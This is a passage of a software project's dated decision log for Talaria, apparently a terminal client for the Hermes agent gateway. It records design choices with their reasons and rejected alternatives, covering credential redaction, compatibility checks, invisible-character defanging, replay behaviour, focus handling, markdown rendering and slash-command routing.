**Rejected alternative — parse the fragment as a query string and redact credential-shaped keys.** It preserves the most information and is wrong: a fragment has no defined syntax, so `#section-token-handling` parses as a key and `#eyJhbGci…` parses as one too. The rule would be a guess dressed as a filter, and its failures would be silent.

**Rejected alternative — drop the fragment in the recorder as well, for one rule everywhere.** Simpler to describe, but it makes the two cases indistinguishable on disk: a URL that never had a fragment and a URL whose fragment was removed would read identically. This module's standing rule is that withholding is recorded rather than silent.

**Revisit when.** The path becomes coverable. The path is the one remaining position a credential can ride in — the `ws://host:9222/devtools/browser/<GUID>` shape Chrome hands out is a live example — and it is left uncovered because every available rule over-redacts worse than it protects. That was also described as blocked on the KTD6 comparator, which could express an authorized divergence in query keys but not elsewhere; this change widened the comparator by exactly the move a path rule would need, so the comparator is no longer the obstacle and only the over-redaction question is.

### An audit's findings graduate to a dated register in `docs/analysis/`, and every open one is mirrored into `QUEUED.md`

**Author.** post-v0.1, conformance audit, at the point the last in-scope finding was remediated

**Decision.** A finding register lives at `docs/analysis/<date>-<audit>-findings.md` and holds every finding the audit produced — resolved ones included, with the commit or pull request that closed them. Any finding still open is *also* written as a `QUEUED.md` entry that names the register as its source. The register is the narrative and the evidence; `QUEUED.md` is the worklist. Neither is a substitute for the other.

**Why the register, rather than only `QUEUED.md` entries.** A finding carries three things the worklist has no place for: how it was found, why the records that should have caught it did not, and what its existence says about the method that produced it. The R1 grading disagreement is the example — the reading pass produced a confident wrong grade sourced from a false sentence in this project's own journal, and that result is the audit's most useful output. It is not deferred work, so it would have no home in `QUEUED.md` and would be lost.

**Why also mirror into `QUEUED.md`, rather than only the register.** Nobody consults a dated analysis document at the moment they need it. DRIFT-02 is the proof: its whole defect was that removing the TypeScript tree under `src/` would silently retire R28's proof, and its resolution is a record placed where the person doing the removal will actually hit it. A register entry alone would have reproduced the original failure in a new location.

**Why an audit's working notes stay out of the repository until the remediation decision is made.** Partial grades read exactly like findings. While grading is in progress the list lives in session scratch, and it graduates once the decision about what to fix has been taken — which is what happened here.

**Rejected alternative — file each finding as a GitHub issue and keep no register.** Issues are good at assignment and bad at standing evidence: they close, they are not read in the tree, and a reader auditing the auditor cannot diff them against the code at a commit. The two are not exclusive, but the tree is the authority.

**Rejected alternative — fold everything into `LEARNINGS.md`.** That file records what was learned from work that was done. Most of an audit's value is findings *not yet* acted on, which is a different lifecycle and would swamp it.

**Revisit when.** A second audit runs. Two dated registers with overlapping requirement coverage will need a rule for which one is current — most likely that the newer supersedes the older per requirement, stated in the newer — and that rule does not exist yet because there has only ever been one.

## 2026-08-04

### Every gateway method Talaria names must be pinned in the compatibility baseline, and a scan enforces it

**Author.** post-v0.1, conformance audit, first pass

**Decision.** `tests/domain/test_compat_coverage.py` parses `talaria/` for module-level `*_METHOD` string constants, and `talaria/ui/prompts.py` for the `_BRIDGES` table, and requires every method name it finds to be in `REQUIRED_METHODS`. The check is deliberately one-directional: the baseline may hold methods that no constant names, because the read-only probes are issued by iterating `COMPAT_BASELINE` itself and so need no constant.

**Why.** `slash.exec` was dispatched by `talaria/domain/commands.py` and absent from the baseline, which made it invisible to the startup check R34 relies on — see the LEARNINGS entry of the same date. Size assertions already existed (`len(EXPECTED_PROBE_SET) == 5`, `len(FORBIDDEN_AT_STARTUP) == 12`) and both passed throughout, because a count pins the size of the list and says nothing about whether the list is the right one. The gap can only close from the other direction: start from what the code declares and require the baseline to account for it.

**Why parsing rather than importing.** Parsing reaches modules nothing in a domain test would otherwise import, cannot run whatever a module does at import time, and keeps the terminal framework out of `tests/domain/` — the bridge table lives in `talaria/ui/prompts.py`, which imports Textual at module scope. The cost is that the scan depends on a naming convention, which is why the falsifiability control pins the ten method names it is known to reach and the bridge table's exact five.

**Rejected alternative — scan for any method-shaped string literal.** A gateway event type is indistinguishable in shape from a method name: `message.delta` and `paste.collapse` are the same string to a regular expression. The scan would have been mostly false positives, and an assertion that has to be suppressed constantly stops being read.

**Rejected alternative — a hand-maintained list of methods to cross-check.** That is a second list with the same failure mode as the first, and nothing would keep the two in step.

**Revisit when.** A gateway method reaches the wire without passing through a `*_METHOD` constant or the bridge table — an inline literal at a call site, or a name assembled at runtime. The scan cannot see either, and the honest response is to change how methods are named rather than to widen the scan into guesswork.

### A replay reads one outbound frame: the operator's own submitted prompt

**Author.** post-v0.1, second operator session against a live gateway

**Decision.** `TalariaApp.ingest` still refuses to fold outbound frames through the reducer, with one exception taken only in replay mode: a recorded `prompt.submit` becomes a `user` transcript entry, via `replayed_submission_text` and `record_replayed_submission`. Live mode does not take that branch. `SUBMIT_METHOD` moves to `talaria.domain.state` and is re-exported from `talaria.ui.app`, because both ends of the method are now domain concerns.

**Why.** The gateway never echoes a submitted prompt back as an event, so the operator's line is written locally at submit time — which never happens in a replay. Replaying a recording of a real session rebuilt the agent's half of the conversation and omitted the question, making R3's own evidence method ("one live turn compared against a replay of the same frames", `talaria/cli.py`) impossible to complete and leaving R30's frame-log-driven interface visibly short a line. The text was never missing from the recording; it was in the outbound half of the frame log the whole time.

**Why live mode must not do it.** `submit_live` has already written the line before the recorder stores the frame, so an unconditional fold prints the operator's message twice — and a duplicated line reads as a message that was actually sent twice, which is worse than an absent one. `tests/replay/test_operator_line.py` fails in one direction if the branch is removed and in the other if the mode test is.

**It claims nothing about delivery.** `record_submission` takes a `DeliveryState` so the transcript can state what a live caller *observed* about the outcome. A replay observed nothing — the acknowledgement, if it came, is a later frame — so `record_replayed_submission` writes the words and stops rather than putting `confirmed` in a transcript on no evidence.

**Known gap, recorded rather than papered over.** The delivery *notes* a live run writes (`not sent`, `delivery unconfirmed`) are locally authored and cross no wire, so a replay cannot reconstruct them either. A recording of a session whose submit went unacknowledged replays as though it were fine.

**Rejected alternative — correlate the request id to its response and set the delivery state.** More faithful. Rejected for now because frames arrive in order, so the outcome is not known at the moment the request is ingested; it would need a deferred amendment to an entry already written, which the append-only transcript has no mechanism for.

**Revisit when.** A second outbound method turns out to carry state that exists nowhere else — that would make this a general "requests the replay must read" rule rather than a single exception, and it should be named as one rather than accumulating branches in `ingest`.

### The invisible-character table holds characters that leave the picture unchanged, which lets the emoji presentation selectors out

**Author.** post-v0.1, second operator session against a live gateway

**Decision.** U+FE0E and U+FE0F — VARIATION SELECTOR-15 and -16, the text and emoji presentation selectors — are removed from `defang`'s table and named in `talaria/ui/literal.PRESENTATION_SELECTORS`. Everything else stays, including U+200D ZERO WIDTH JOINER, VARIATION SELECTOR-1 through -14, and VARIATION SELECTOR-17 through -256. `defang` remains one function applied to every string; this narrows the single rule rather than splitting it.

**Why, and what the rule actually is.** The table's purpose is that the rendered path is the executed path: an operator approves a *picture*, so no two byte strings may produce one picture. Read that way the criterion is not "draws nothing" but "draws nothing **and changes nothing visible**" — which is what makes a zero-width joiner dangerous, since `rm` and `r<ZWJ>m` are one picture and two commands. A presentation selector fails that criterion and is measurably not in the class: `⚠` is one cell and `⚠️` is two, so the extra bytes are on screen. `tests/ui/test_prompts.py::test_a_presentation_selector_changes_the_picture_and_a_joiner_does_not` measures it rather than asserting it, and fails if a Rich or terminal change ever makes the two render alike.

**What it does not fix, deliberately.** Emoji assembled from ZWJ sequences — a multi-person family — still arrive as their component parts with a marker between them. The joiner is the hazard; that it is also emoji syntax does not make it less of one.

**Rejected alternative — a strict `defang` for commands and a lenient one for prose.** The original module docstring rejected this and it is still rejected: two rules means one of them is eventually applied to the wrong string, and the string it would be applied to wrongly is the command.

**Rejected alternative — exempt the whole U+FE00–U+FE0F block.** Simpler as a range edit. Rejected because VS-1 through VS-14 select CJK and mathematical glyph variants a reader cannot reliably tell apart, so they fail the same picture-changes test the presentation selectors pass.

**Rejected alternative — exempt U+200D as well, so emoji work completely.** Rejected on the criterion above. It is also the case Rich itself measures wrong: `cell_len("r<ZWJ>m")` returns 1 where a terminal draws 2, so exempting it would put `wrap_command`'s column arithmetic out of step with the screen — the second way to show a command that is not the one that runs.

**Revisit when.** A terminal stack renders `⚠` and `⚠️` at the same width, which would put the presentation selectors back in the class this exempts them from — the measuring test is where that shows up. Or a reason appears to treat emoji-sequence joiners differently from bare ones, which would need a grapheme-cluster pass this deliberately does not have.

### `thinking.delta` is the activity line; `reasoning.delta` is the transcript

**Author.** post-v0.1, second operator session against a live gateway

**Decision.** `thinking.delta` writes `SessionState.thinking_notice` — one string, replaced not appended, cleared at every turn boundary, clipped to one row — which `prompt_view` projects and `activity_line` shows in place of `working…`. It never reaches the transcript and never opens a turn. `reasoning.delta` and `reasoning.available` are untouched and still carry the reasoning block in full.

**Why.** The two events are not two names for one thing. `thinking.delta` is Hermes's live spinner text, written by `run_agent._emit_wait_notice` so a stalled provider can say what it is waiting on, and Hermes documents it as rendering "as the live spinner/status line" (`run_agent.py:1047`). The model's reasoning arrives on `reasoning.delta` instead. Appending a status line to an append-only transcript is the same mistake `_ignore` already avoids for `tool.progress`, and it produced both a glued line (`· (◐) indexing...The user wants…`) and, through `reasoning.available`'s already-have-deltas guard, the wholesale loss of reasoning blocks.

**R6 is not weakened.** Its obligation is that reasoning-block content is never dropped, and the reasoning block is on the channel this leaves alone. The note is not dropped either — it moves to the region that matches what it is: one row, overwritten, describing right now.

**Rejected alternative — ignore `thinking.delta` outright**, as `tool.progress` and `tool.generating` are ignored. Cheapest, and defensible on the same argument. Rejected because the event exists precisely to answer "why has nothing happened for two minutes", and a client that shows `working…` through a ten-minute provider stall is throwing away the one signal that explains it.

**Rejected alternative — commit it to the transcript on its own line** rather than gluing it. Fixes the reported line and keeps every byte. Rejected because it is the same spam one row down: the gateway sends a frame per animation step, so a long turn writes a column of spinner frames through the middle of the conversation.

**Rejected alternative — let the note outrank the withdrawn-approval line.** Rejected: the withdrawal line is not information but a correction, on the one case where `working…` may be false. A true note about the gateway indexing does nothing to stop an operator believing a session Talaria can no longer unblock is progressing.

**Revisit when.** A gateway is seen sending reasoning prose on `thinking.delta` — which would mean a different agent runtime behind the same protocol, and would make this a content channel after all. `tests/domain/test_thinking_status.py` is where that evidence should land.

### When Talaria takes a control away, the caret goes back to the composer

**Author.** post-v0.1, second operator session against a live gateway

**Decision.** A region that removes a control holding the caret, or revokes that control's focusability, posts `CaretReleased` (`talaria/ui/focus.py`); `TalariaApp.on_caret_released` focuses the composer. Three sites raise it today: `PromptRegion.apply` when a card is removed, `AgentRows.apply` when rows are removed, and `AgentRow.bind_row` when a finished child makes its own row unfocusable. Focus moves the *operator* makes are never touched.

**Why.** Textual's own answer — `Screen._reset_focus` — hands the caret to the neighbouring entry in the focus chain, and the neighbour above every control Talaria mounts is the `VerticalScroll` region containing it. A scroll container is focusable so arrow keys scroll it, and it discards every printable key it is given, so the interface silently stops accepting text with nothing on screen to say why. The composer is the answer for the same reason it is focused at mount: it is the only widget whose whole job is to accept typing, and it is what the operator is reaching for in every case that raises this.

**Rejected alternative — assert the invariant in the render pass.** Simpler, and it would need no message: check at the end of each render that the caret is somewhere sensible and move it if not. Rejected because the render pass runs on the coalescing timer, so it would drag the caret back roughly twenty times a second from anywhere the operator deliberately put it — making the transcript impossible to focus and scroll. The defect is specifically *the caret moving without the operator*, so the fix belongs at those transitions and nowhere else. `tests/ui/test_focus_returns.py::test_a_deliberate_focus_move_is_left_alone` fails if this is ever reintroduced.

**Rejected alternative — make `PromptRegion` unfocusable while it holds no cards.** Fixes the two prompt paths cheaply and truthfully (an empty scroll region has nothing to scroll). Rejected because the caret then falls to `TranscriptPane`, which is also a `VerticalScroll` and swallows keys identically, and because it does nothing at all for the sub-agent row — whose caret is lost without any widget being removed.

**Rejected alternative — have the regions focus the composer themselves.** Fewer moving parts than a message. Rejected on ADR-0002's grain: a widget that reaches across the tree for a named sibling can only be mounted in a screen that has one, and these regions are otherwise self-contained.

**Revisit when.** A fourth site needs to raise this, or a control appears that should legitimately keep the caret after the operator answers it. Either is a sign the rule wants to be "hand back to whatever last had it" rather than "hand back to the composer" — which needs a focus history the app does not keep today.

### Inline markdown is rendered on agent prose; block markdown stays out of scope

**Author.** post-v0.1, second operator session against a live gateway

**Decision.** `talaria/ui/markdown.py` renders `**strong**`, `*emphasis*`, and backtick code spans on transcript lines whose entry kind is `assistant` or `reasoning`, consuming the delimiters. Everything else — headings, fenced blocks, lists, tables, links, block quotes — stays literal, and so does every other entry kind. Block-level rendering is queued as its own piece of work at the operator's request.

**This amends R6, deliberately.** R6 reads: *"Transcript content renders as readable plain text. Markdown, diff, and reasoning-block presentation are out of scope, but their content is never dropped."* The first clause is presentational and is what changes. The second is an obligation and does not: nothing here runs before the projection, so `TranscriptView` still publishes the agent's bytes verbatim, `terminal_read` still serves them (KTD10), and the recording still holds them. `tests/domain/test_projection.py::test_every_transcript_entry_survives_into_the_line_buffer` continues to enforce that half untouched.

**Why inline and not the rest.** `TranscriptPane` mounts one widget per line, and four separate mechanisms are stated in those terms: KTD14's cap counts widgets, the stable-prefix diff indexes lines, `_top` plus the condensed banner is a line position, and the scroll anchor subtracts evicted widget heights. Every inline construct is resolvable from one line in isolation, so it costs none of that. A heading or a fenced block is one renderable spanning many lines and breaks all four at once — plus it has a streaming problem inline rendering does not, since a code fence is ambiguous until its closer arrives.

**Why only two entry kinds.** `user` is the operator's own typed text, and echoing back something other than what they typed is its own small deceit. `tool` is program output — file contents, listings, diffs — where an asterisk is far more likely to be a glob or a C comment than a request for italics, and restyling it makes the screen disagree with the program that produced it. Both were confirmed on a live gateway: the operator's `**Judgment**` stayed literal on the `›` line in the same screen where the agent's reply rendered it bold.

**Rejected alternative — hand the line to `rich.markdown.Markdown` or any real parser.** Enormously more capable and roughly one line of code. Rejected on two counts. It emits block renderables, so it breaks the mount model above. And every renderer in this package builds a `Text` explicitly so that Rich's console markup is never parsed over gateway-supplied bytes; a parser that takes a `str` is exactly how that guarantee gets lost by accident later.

**Rejected alternative — support `_emphasis_` and `__strong__` as well.** It is valid CommonMark, and leaving it out means some agent prose renders half-styled. Rejected because CommonMark renders `__init__.py` as a bold `init`, and quietly rewriting a Python identifier is a worse defect than the asterisks this feature removes — on a client whose stated posture is that the rendered path is the executed path. Underscores are left alone entirely; `tests/ui/test_markdown.py::UNTOUCHED` pins it.

**Rejected alternative — strip markdown markers without styling them.** Cheapest possible fix for the visible complaint. Rejected because it deletes characters and puts nothing in their place, which is content loss on the surface the operator reads, and R6's surviving clause is precisely about not doing that.

**Rejected alternative — match emphasis before extracting code spans.** Simpler control flow. Rejected because asterisks inside a code span would then be styled and consumed: `` `f(**opts)` `` would render as `f(opts)` in bold, which is a wrong rendering of code rather than a cosmetic gap. Code spans are extracted first and emphasis is matched over a skeleton in which each span is a single placeholder — NUL, which is safe only because defanging removes NUL first, and a test pins that rather than trusting the comment.

**Revisit when.** Block-level rendering is taken up (see `QUEUED.md`, P2), or an operator reports prose that renders half-styled often enough to reopen the underscore decision. If the second happens, the fix is a narrower rule — underscores only when the run is not adjacent to a word character on the outside — not CommonMark's full flanking algorithm.

## 2026-08-03

### A background task that dies takes the client down, rather than being reported and left running

**Author.** v0.1 milestone-2, unit U10 (daily-driver closure), adversarial verification

**Decision.** `TalariaApp._supervise` attaches a done-callback to every fire-and-forget task the app starts — today the live startup sequence and the catalogue fetch. A non-cancellation exception is written into the transcript as a named local note and the app exits 70, the same code a failed frame stream uses.

**Why.** These two tasks are what make a live client usable. Without the startup sequence the compatibility check never ran and no session was ever opened, so the operator faces a connected client attached to nothing, with every control live. Neither coroutine is supposed to be able to raise — `LiveSource.call` returns an `RpcOutcome` on every exit rather than raising — so an exception here is a defect, and a defect that leaves the interface looking healthy is the worst shape it can take.

**Rejected alternative — report the failure and keep running.** Attractive for the catalogue fetch, whose absence only costs slash completions. Rejected because it makes the supervisor's behaviour depend on which task failed, and because the interface's own model of "the catalogue failed" (`CommandCatalog.available`) is set by `load_catalog` from an `RpcOutcome`; an exception means that path did not run, so the interface would render a state nothing had computed.

**Rejected alternative — let asyncio's "Task exception was never retrieved" warning serve.** That warning goes to stderr, underneath a full-screen Textual application. It is the status quo that produced this defect.

**Revisit when.** A third supervised task appears whose failure genuinely is survivable, or an operator reports Talaria exiting 70 for something they consider cosmetic. At that point the supervisor should take a per-task severity rather than growing a special case.

### `--record` belongs on the bare launcher, not only on `talaria record`

**Author.** v0.1 milestone-2, unit U10 (daily-driver closure), adversarial verification

**Decision.** `talaria --record [PATH]` records every frame of a live session to a frame log while the interface runs. `LiveSource` already accepted a recorder; the launcher now passes one.

**Why.** R3 — one live turn streamed to completion and its transcript compared against a replay of the same frames — is what this build's verdict names as the thing that would move it. That run has to be recorded *while somebody is driving the client*. `talaria record` attaches and dumps frames with no interface, so recording a session and using one were mutually exclusive, and the verdict document's own remediation step named something the shipped client could not do. This is the same defect shape as the paste threshold that was configurable only in the mode that ignored it, one level up.

**Rejected alternative — leave it to `talaria record` and tell the operator to run two clients.** Two clients means two sessions; a recording of a *different* session proves nothing about the one whose transcript is being compared.

**Rejected alternative — always record.** Every live session would write a frame log holding the whole conversation. R29 keeps corpora out of version control precisely because they carry session content; writing one unasked is the wrong default.

**Revisit when.** R2 and R3 have been run. If the recording turns out to be something every first attach wants, an opt-out is a better default than an opt-in.

### Malformed configuration disables its own feature; it never stops the client from starting

**Author.** v0.1 milestone-2, unit U10 (daily-driver closure), adversarial verification

**Decision.** A setting whose value is the wrong type falls back — `parse_command` returns `None` for a non-string `status.command`, `_build_paste_threshold` returns the documented defaults for a non-integer bound — and the client starts. A malformed *integer* still raises `ConfigError` from `config.py`, because that path names the variable and happens before any interface exists.

**Why.** `status.command = ["sh", "-c", "date"]` is the obvious operator guess for an argv array, and it used to produce a raw `AttributeError` traceback out of `shlex` and exit 1 — a whole terminal client refusing to start over an optional status line, once U10 put that call on the bare-`talaria` path.

**Rejected alternative — validate types at the config layer and raise.** Consistent, and it turns every future typo into an outage for a feature the operator may not even use. The asymmetry is deliberate: `config.py` raises for a value it cannot coerce *within* a setting's own type, and consumers fall back for a value of the wrong type entirely.

**Cost, stated plainly.** The fallback is silent. An operator whose status line stopped appearing has nothing to read. That is filed in `QUEUED.md` with the shape of the fix (startup notes carried into the transcript), and it is a real cost, not a rounding error.

**Revisit when.** The startup-notes mechanism exists — at that point the fallback should announce itself and this decision keeps its behaviour while losing its downside.


### A compatibility gap blocks the daily-driver verdict, not the launch

**Author.** v0.1 milestone-2, unit U10 (daily-driver closure)

**Decision.** The startup compatibility check names every gap it finds — in the composer notice and as one transcript line per blocking method — and then the client carries on and opens the session. AE7's "blocks ready" is enforced in `docs/analysis/2026-08-02-v0-1-daily-driver-verdict.md`, which is where the ready verdict lives.

**Why.** The alternative reading is that a client which cannot verify its gateway should refuse to start. Applied to the actual failure modes, that is worse for the operator in every case: a response that grew a key, a method renamed in a Hermes upgrade, or a probe that timed out on a busy machine would each cost the operator their session, at the moment they were trying to start work, for a condition they can neither diagnose from a refusal nor fix in the next five minutes. Naming the gap gives them the diagnosis *and* the session.

**Rejected alternative — refuse to start on any blocking verdict.** Rejected on the reasoning above. Also rejected because it makes the check's own correctness safety-critical: a false positive in drift detection would become an outage rather than a wrong sentence.

**Rejected alternative — a `--force` flag to start anyway.** A flag operators would learn to always pass carries no information and adds a second code path.

**Revisit when.** A real gateway has been attached (R2) and the check's false-positive rate against real responses is known. If drift detection proves precise, refusing on a *missing method* specifically — as opposed to a drifted shape — becomes defensible.

### `unproved` blocks the verdict; `not-probed` does not

**Author.** v0.1 milestone-2, unit U10

**Decision.** In `talaria/transport/compat_check.py`, a probe whose outcome is unknown (no reply, lost transport, not connected) grades `unproved` and blocks. A method that was deliberately never probed grades `not-probed` and does not block, but is counted in the report's first line on every run — including a clean one.

**Why.** These are different facts and collapsing them loses whichever one matters. "We asked and heard nothing" is a gap in evidence and AE7 says the verdict is blocked on any gap; a check that read silence as a pass would report a compatible gateway for a socket that answered nothing at all. "We deliberately did not ask, because asking would create a session" is R34 working as designed — but if that also blocked, thirteen of the eighteen methods would block every run forever and the flag would carry no information.

**What stops the second one becoming a quiet pass.** The report's summary line always states the unverified count: `gateway compatibility: 0 blocking, 13 unverified at runtime (evidence-only, R34), baseline 7f4d15515`. A summary reading "compatible" after probing five of eighteen would be a claim about thirteen it never touched.

**Correction, 2026-08-05.** The two paragraphs above said "twelve of the seventeen methods", quoted the summary line as `12 unverified at runtime`, and closed "probing five of seventeen would be a claim about twelve it never touched". All three counts were stale, not wrong when written. Commit `ec861fa` pinned `slash.exec` and took the evidence-only set from twelve to thirteen — counted directly as `classification="evidence-only"` in `talaria/domain/compat.py` at `ec861fa~1` (twelve) and at `ec861fa` (thirteen) — which also takes the required set from seventeen to eighteen. That sweep updated `tests/transport/test_compat_baseline.py` but not this entry. The corrected numbers are measured, not inferred: `tests/transport/test_compat_baseline.py:205` asserts `len(FORBIDDEN_AT_STARTUP) == 13`, and `:553` asserts the live summary line reads `13 unverified at runtime`. The decision itself is unchanged; only its arithmetic moved.

**Revisit when.** The evidence-only set shrinks — every method a live acceptance run exercises moves from inference to measurement, and the count in that line should fall.

### Sweep the status child's process group whatever the leader's reap state

**Author.** v0.1 milestone-2, unit U10

**Decision.** `StatusRunner._run_once`'s `finally` calls `_kill_process_group` unconditionally. The earlier guard — sweep only while `process.returncode is None` — is removed.

**Why.** The guard was written against pid recycling: once a child is reaped its pid is free, so signalling its group could in principle reach an unrelated one. That risk is real and it is *bounded* — this runs inside one tick, at most `timeout_seconds` after the leader exited, and `self._process` is cleared immediately afterwards so nothing signals a group whose tick has ended. For the pid to be recycled inside that window the machine would have to allocate its entire pid range in about two seconds. The leak the guard caused is *certain*: one surviving process per tick, for the whole life of the client, measured.

**Rejected alternative — keep the guard and sweep at teardown instead.** Tried, and it does stop the process outliving Talaria. It does not stop the accumulation while Talaria runs, which is the larger problem, and it made the teardown path the only thing standing between an operator and a growing process table.

**Rejected alternative — capture the pgid at spawn and verify group membership before signalling.** There is no portable way to ask "does this group still contain only my descendants", and a partial answer would be more confusing than the accepted bound.

**Revisit when.** A platform is added where pid recycling is fast (some containers reuse aggressively), or if `asyncio` gains a way to defer reaping.

### `--resume` with nothing to resume reports; it does not create

**Author.** v0.1 milestone-2, unit U10

**Decision.** When `session.most_recent` answers `{"session_id": null}` — its documented answer on a machine with no prior session (`tui_gateway/methods_session.py:234`) — Talaria says so in the notice and the transcript and opens nothing.

**Why.** The alternative is a silent substitution: the operator asked to return to their last conversation and is placed in a brand-new one that looks identical until they refer to something they said yesterday. The cost of the chosen behaviour is one extra command; the cost of the other is a confusing session and, potentially, work redone.

**Rejected alternative — fall back to `session.create` with a notice.** The notice is on the bar and is overwritten by the next thing that happens; the substitution is not.

**Revisit when.** Operators report the extra step as friction, at which point a `--resume-or-new` flag makes the intent explicit rather than assumed.

### The live startup sequence runs only for an app that was given a startup selection

**Author.** v0.1 milestone-2, unit U10

**Decision.** `TalariaApp.begin_live_startup` returns immediately unless `self.startup` is a `StartupSelection`. The launcher supplies one; the framework validation gate and every dispatcher-double test do not.

**Why.** The sequence's second half calls `session.create` or `session.resume`. Making it fire for any live-mode app would mean a test double, or a gate run pointed at a socket, opening a session on whatever is on the other end. Gating on the selection makes "this app owns a session" an explicit statement by the caller rather than an inference from `mode == "live"`.

**Rejected alternative — a separate `open_session: bool` flag.** Two parameters that must agree, where one already implies the other.

**Revisit when.** A second caller needs the compatibility check without the session open — at which point `verify_gateway()` is already a public method and can be called directly.

### Send an ordinary command through `slash.exec`, and keep `command.dispatch` as the fallback

**Author.** v0.1 milestone-2, unit U9 (slash commands and paste collapse), adversarial closing round

**Decision.** `TalariaApp.dispatch_command_live` calls `slash.exec` with the whole command line first. If that is refused it calls `command.dispatch` with the name and argument. Both replies feed the same generic renderer: `slash.exec` answers either `{"output": …}` — decoded as `SlashOutput` — or a `command.dispatch` payload it forwarded internally, which is decoded as the shape it is. The discriminator is whether the reply carries a string `type`.

**Why this is not a symmetry.** At `7f4d15515`, `command.dispatch`'s last line is `_err(rid, 4018, f"not a quick/plugin/bundle/skill command: {name}")` (`tui_gateway/methods_tools.py:1070`). Above it the handler serves only quick commands, plugin commands, skill bundles, skill commands, and twelve hardcoded name groups. The registry has 90 `CommandDef` rows. The catalogue builder drops a row when `cmd.name in _TUI_HIDDEN or cmd.gateway_only` (`methods_tools.py:272`), and those two sets overlap completely: `_TUI_HIDDEN` is `{sethome, set-home, commands, approve, deny}` (`tui_gateway/server.py:11504`), of which the four that are registry command names are all already `gateway_only`. So the filter removes exactly the 8 `gateway_only` rows and **a real catalogue carries 82 registry commands**, plus the three `_TUI_EXTRA` entries that survive the dedup guard. Note `cli_only` is *not* filtered — the 33 `cli_only` rows are catalogued too. Only a minority of those 82 — quick commands, plugin commands, skill bundles, skill commands, and twelve hardcoded name groups — is anything `command.dispatch` serves; the exact residual is not derivable from the registry alone, because three of those five sets are assembled at runtime from the operator's config and installed skills. A client that calls only `command.dispatch` therefore lists most of the catalogue with a blank availability marker, meaning "this dispatches", and refuses those rows on use. That is the same honesty clause the unit already applies to the client-local extras, failing on a set an order of magnitude larger. Hermes's own client has always had the right ordering (`ui-tui/src/app/createSlashHandler.ts:147-166`: `slash.exec` in the try, `command.dispatch` in the `.catch()`).

*An earlier version of this paragraph said the catalogue carries "roughly 78" by subtracting 8 `gateway_only` and "4 hidden" as though they were disjoint, and put the residual at "about 67".* Both numbers were recomputed from the pinned registry by parsing it: the hidden four are inside the eight, and the residual cannot be pinned down without a live catalogue. The qualitative claim the decision rests on — that `command.dispatch` alone would fail most of the listing — is unchanged and is carried by the 4018 line above, not by the arithmetic.

**Rejected alternatives.** *Keeping `command.dispatch` only and marking the affected rows unsupported* was the honest version of the status quo, and it is worse: Talaria cannot tell from a catalogue row which side of that line a command falls on, so it would have to mark almost everything unsupported or guess. *Calling `slash.exec` only* loses skill commands, which it refuses outright (`:1146`), and any command run without a focused session, which it needs and `command.dispatch` does not. *Probing at startup to learn which handler serves what* is 78 speculative dispatches, each a mutation.

**Revisit when.** The gateway merges the two handlers, or publishes per-command routing in the catalogue. Either makes the fallback dead code rather than a second real path, and dead code is the thing to remove.

### Follow an alias to what it points at, with a chain Talaria remembers

**Author.** v0.1 milestone-2, unit U9, adversarial closing round

**Decision.** An `alias` result's target is resolved and run, carrying the original argument, up to `ALIAS_FOLLOW_LIMIT` (3) hops and never onto a name already in the chain.

**Rationale.** An `alias` result names a target and runs nothing — the handler returns `{"type": "alias", "target": qc.get("target", "")}` straight out of the operator's quick-commands config (`methods_tools.py:600`). Hermes's client re-dispatches it (`createSlashHandler.ts:100-102`). Rendering the target and stopping turns a working quick command into a dead end that *looks* like a result, which is worse than an error: the transcript shows a line, so nothing appears to have gone wrong.

**Rejected alternatives.** *Following with no bound*, as the official handler does, treats an alias that points at itself as impossible. It is a config typo. *Refusing to follow and saying so* keeps the client simple and leaves the operator to retype what the gateway just told them.

**Revisit when.** A real quick-commands config is observed with a chain deeper than three, which would make the bound a limitation rather than a guard.

### Insert a large paste literally first, and refuse Enter while the collapse is out

**Author.** v0.1 milestone-2, unit U9, adversarial closing round

**Decision.** `ChatTextArea._on_paste` inserts the pasted text literally and unconditionally, then asks the gateway to collapse it; the placeholder replaces the body by search-and-replace when the reply lands. While any collapse is outstanding, Enter submits nothing and says why — except for the Talaria-local four, which never touch a socket.

**Rationale, including the cost.** Inserting literally first makes KTD4's behaviour the floor for every paste, including one whose collapse is about to fail and one arriving in replay where there is no gateway at all; every failure path then ends in the same place with no branch that clears the editor. **The cost is a window.** For the length of the round trip the composer holds the whole body, and paste-then-Enter is ordinary muscle memory: measured with the guard reverted in a disposable clone, a 401-line, 7919-character paste followed by Enter put the entire body into `prompt.submit` — the assertion `sent(gateway, SUBMIT_METHOD) == []` failed with a payload ending `'…pasted line 399'`. That is precisely the outcome KTD16 exists to prevent. Hermes's client cannot reach that state because it computes its placeholder locally and inserts *that* synchronously (`ui-tui/src/app/useComposerState.ts`), using `paste.collapse` only to backfill the path. The guard is what pays for the inversion.

**Rejected alternatives.** *Computing the placeholder locally, as Hermes does*, removes the window and makes Talaria's placeholder a claim about a file the gateway has not written yet — a reference the operator can submit before it exists. *Inserting nothing until the reply lands* makes every large paste look like a dropped keystroke for the length of an RPC, and loses the text entirely if the reply never comes. *Queueing the submit to run after the collapse* silently sends a message the operator has had no chance to see in its collapsed form.

**Revisit when.** `paste.collapse` is measured against a real gateway. If the round trip is reliably short the guard is nearly invisible; if it is slow, deferring the submit rather than refusing it becomes worth its complexity.

### Route a dispatch result by where its text goes, not by which shape it is

**Author.** v0.1 milestone-2, unit U9 (slash commands and paste collapse)

**Decision.** `talaria/domain/commands.py:render_dispatch` never reads `result.type`. U3's decoder already folds all six `command.dispatch` shapes into one record with three text destinations — `display_text` (the transcript), `submit_text` (the model), `prefill_text` (the composer) — and the renderer routes those three fields. The result is that `exec`, `plugin`, `alias`, `skill`, `send` and `prefill` take one code path, and a seventh shape that populated the same fields would take it too. Pinned by `tests/domain/test_commands.py::test_every_shape_with_the_same_fields_renders_the_same_way`, which builds six results differing *only* in their type and asserts the six renderings are one value.

**Rejected alternatives.** *A handler per result type* is the obvious reading of "six shapes" and is what the constraint "no gateway command gets a bespoke interface" is one step away from: six handlers become seven, then seven with a special case for the bundle. *A command registry mirroring Hermes's*, so Talaria knows what `/model` means, loses the first time Hermes changes it and loses silently. *A `skill` result falling back to `message` when `display` is absent* was rejected in U3 and stays rejected: the gateway emits `display` alongside `message` at every skill and bundle site, so the fallback is only reached when something is wrong, and what it would reach is the expanded scaffold the field exists to keep off the screen.

